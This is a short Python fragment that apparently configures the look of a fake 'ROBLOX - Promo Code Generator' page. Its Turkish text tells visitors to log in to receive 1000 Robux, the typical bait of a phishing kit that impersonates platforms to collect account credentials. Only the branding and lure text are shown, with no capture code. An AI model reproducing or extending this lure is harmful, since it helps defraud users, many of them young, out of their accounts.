    if platform == "Roblox":
        bg_color, accent, btn_color = "#191B1D", "#00B2FF", "#00B2FF"
        title, desc = "ROBLOX - Promo Code Generator", "Hesabınıza 1000 Robux tanımlamak için giriş yapın."
